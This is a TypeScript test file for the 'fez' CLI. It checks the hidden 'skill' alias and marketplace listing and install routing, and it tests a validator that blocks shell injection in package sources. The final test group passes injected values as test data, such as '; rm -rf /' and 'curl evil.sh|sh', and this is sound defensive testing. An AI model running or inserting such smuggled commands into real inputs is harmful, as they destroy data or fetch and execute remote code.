import { describe, expect, test } from "vitest";
import { Command } from "commander";
import { registerSkillCommands, buildListing, resolveInstallAction, safePackageSource } from "../../../src/cli/cmd-skill.js";

/**
 * `fez tool` is the renamed command (was `fez skill`) for the MCP-server
 * catalog. `fez skill` stays registered as a hidden alias for one release
 * so existing scripts/muscle memory keep working, but it must not show up
 * in `fez --help`. Pattern follows cli-relay-defaults.test.ts: register
 * against a bare Command and assert on the resulting command tree, since
 * fez-evals has no exec-based CLI harness.
 */
describe("fez tool (skill hidden alias)", () => {
  const program = new Command();
  registerSkillCommands(program);

  test("`tool` is a real, visible command with the MCP-servers description", () => {
    const tool = program.commands.find((c) => c.name() === "tool");
    expect(tool).toBeDefined();
    expect(tool!.description()).toContain("Tools (MCP servers)");
    expect((tool as unknown as { _hidden?: boolean })._hidden).not.toBe(true);
  });

  test("`skill` still routes — same subcommands as `tool` — but is hidden from help", () => {
    const skill = program.commands.find((c) => c.name() === "skill");
    expect(skill).toBeDefined();
    expect((skill as unknown as { _hidden?: boolean })._hidden).toBe(true);

    const tool = program.commands.find((c) => c.name() === "tool")!;
    const toolSubs = tool.commands.map((c) => c.name()).sort();
    const skillSubs = skill!.commands.map((c) => c.name()).sort();
    expect(skillSubs).toEqual(toolSubs);
    expect(toolSubs).toEqual(["add", "install", "list", "market", "publish", "remove"]);
  });

  test("`fez --help` (visibleCommands) excludes `skill` but includes `tool`", () => {
    const visible = program.commands.filter((c) => !(c as unknown as { _hidden?: boolean })._hidden).map((c) => c.name());
    expect(visible).toContain("tool");
    expect(visible).not.toContain("skill");
  });
});

/**
 * Task 9: skills become publishable/installable through the marketplace
 * rail, same as extension/pi-package — a SKILL.md package, never an
 * mcpServers write. `publish`/`install` are inline action closures that
 * dial a real relay, so — per the Task 7 test's own pattern (no relay
 * faking exists here either) — these test the pure helpers the actions
 * delegate to: the listing shape `publish` signs, and the routing
 * decision `install` makes from a parsed listing.
 */
describe("fez tool publish/install — artifact skill routes to a package install", () => {
  test("buildListing(--artifact skill) carries artifact + source, no mcp config", () => {
    const listing = buildListing("web-search", "skill", undefined, {
      description: "Search the web",
      source: "npm:@scope/web-search-skill",
    });
    expect(listing.artifact).toBe("skill");
    expect(listing.source).toBe("npm:@scope/web-search-skill");
    expect(listing.installCmd).toBe("fez install npm:@scope/web-search-skill");
    expect(listing).not.toHaveProperty("command");
    expect(listing).not.toHaveProperty("url");
  });

  test("buildListing(--artifact skill, git source) carries the git: spec verbatim", () => {
    const listing = buildListing("code-review", "skill", undefined, {
      source: "git:github.com/o/r",
    });
    expect(listing.source).toBe("git:github.com/o/r");
    expect(listing.installCmd).toBe("fez install git:github.com/o/r");
  });

  test("buildListing(--artifact mcp) is unaffected — no source field, config carried as before", () => {
    const listing = buildListing("github", "mcp", { command: "npx", args: ["-y", "github-mcp"] }, {});
    expect(listing.artifact).toBe("mcp");
    expect(listing).not.toHaveProperty("source");
    expect(listing.command).toBe("npx");
  });

  test("resolveInstallAction: artifact skill routes to a package install, never mcpServers", () => {
    const action = resolveInstallAction({ artifact: "skill", source: "npm:@scope/web-search-skill" });
    expect(action).toEqual({ kind: "package", source: "npm:@scope/web-search-skill" });
  });

  test("resolveInstallAction: artifact mcp still routes to an mcpServers write", () => {
    const action = resolveInstallAction({ artifact: "mcp", command: "npx", args: ["-y", "github-mcp"] });
    expect(action).toEqual({ kind: "mcp", config: { command: "npx", args: ["-y", "github-mcp"] } });
  });

  test("resolveInstallAction: artifact extension still just prints its installCmd (unchanged)", () => {
    const action = resolveInstallAction({ artifact: "extension", installCmd: "fez install npm:@scope/ext" });
    expect(action).toEqual({ kind: "print", installCmd: "fez install npm:@scope/ext" });
  });
});

/**
 * Critical fix: a listing's `source` is authored by ANY pubkey and
 * reaches `PackageManager.install()`'s `execSync(`git clone ${url} …`)`
 * unescaped. Anchored patterns, no shell metacharacters, checked at the
 * point of consumption (resolveInstallAction) as well as at publish.
 */
describe("safePackageSource — anchored, no shell metacharacters reach execSync", () => {
  test("refuses a source carrying shell injection", () => {
    expect(safePackageSource("git:github.com/o/r; rm -rf /")).toBe(false);
    expect(safePackageSource("git:github.com/o/r; curl evil.sh|sh #")).toBe(false);
    expect(safePackageSource("npm:@scope/pkg && curl evil.sh|sh")).toBe(false);
  });

  test("passes a clean npm: source", () => {
    expect(safePackageSource("npm:@scope/web-search-skill")).toBe(true);
    expect(safePackageSource("npm:some-pkg")).toBe(true);
  });

  test("passes a clean git:github.com/o/r source", () => {
    expect(safePackageSource("git:github.com/o/r")).toBe(true);
  });

  test("refuses undefined/empty", () => {
    expect(safePackageSource(undefined)).toBe(false);
    expect(safePackageSource("")).toBe(false);
  });

  test("resolveInstallAction rejects a malicious skill source instead of routing to a package install", () => {
    const action = resolveInstallAction({ artifact: "skill", source: "git:github.com/o/r; rm -rf /" });
    expect(action.kind).toBe("reject");
  });

  test("resolveInstallAction still routes a clean git: skill source to a package install", () => {
    const action = resolveInstallAction({ artifact: "skill", source: "git:github.com/o/r" });
    expect(action).toEqual({ kind: "package", source: "git:github.com/o/r" });
  });
});
